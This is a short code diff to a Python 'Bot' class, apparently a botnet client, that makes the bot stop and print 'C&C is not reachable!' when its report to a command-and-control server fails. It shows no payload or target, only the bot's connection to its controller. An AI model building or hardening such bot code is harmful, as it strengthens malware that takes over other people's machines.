@@ -53,7 +53,10 @@ class Bot:
     ircPort = 6667
 
     def __init__(self):
-        self.sendInfo()
+        res = self.sendInfo()
+        if res == False:
+            print("C&C is not reachable!")
+            return
         task = []
         with ThreadPoolExecutor(max_workers=2) as exec:
             task.append(exec.submit(self.httpServer))
@@ -74,6 +77,7 @@ class Bot:
             s.close()
         except Exception as e:
             print("Information send error: ", e)
+            return False
         finally:
             s.close()
 
